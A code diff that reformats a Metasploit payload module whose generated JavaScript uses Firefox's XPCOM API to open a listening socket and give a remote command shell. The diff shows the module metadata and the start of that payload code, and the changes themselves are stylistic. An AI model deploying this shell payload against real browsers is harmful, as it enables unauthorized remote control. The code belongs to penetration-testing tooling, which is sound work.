@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = :dynamic
 
   include Msf::Payload::Single
@@ -13,28 +11,31 @@ module MetasploitModule
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Command Shell, Bind TCP (via Firefox XPCOM script)',
-      'Description'   => %q{Creates an interactive shell via Javascript with access to Firefox's XPCOM API},
-      'Author'        => ['joev'],
-      'License'       => BSD_LICENSE,
-      'Platform'      => 'firefox',
-      'Arch'          => ARCH_FIREFOX,
-      'Handler'       => Msf::Handler::BindTcp,
-      'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'firefox'
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Command Shell, Bind TCP (via Firefox XPCOM script)',
+        'Description' => %q{Creates an interactive shell via Javascript with access to Firefox's XPCOM API},
+        'Author' => ['joev'],
+        'License' => BSD_LICENSE,
+        'Platform' => 'firefox',
+        'Arch' => ARCH_FIREFOX,
+        'Handler' => Msf::Handler::BindTcp,
+        'Session' => Msf::Sessions::CommandShell,
+        'PayloadType' => 'firefox'
+      )
+    )
   end
 
   #
   # Returns the JS string to use for execution
   #
   def generate(_opts = {})
-    %Q|
+    %|
     (function(){
       window = this;
       Components.utils.import("resource://gre/modules/NetUtil.jsm");
-      var lport = #{datastore["LPORT"]};
+      var lport = #{datastore['LPORT']};
       var rhost = "#{datastore['RHOST']}";
       var serverSocket = Components.classes["@mozilla.org/network/server-socket;1"]
                              .createInstance(Components.interfaces.nsIServerSocket);
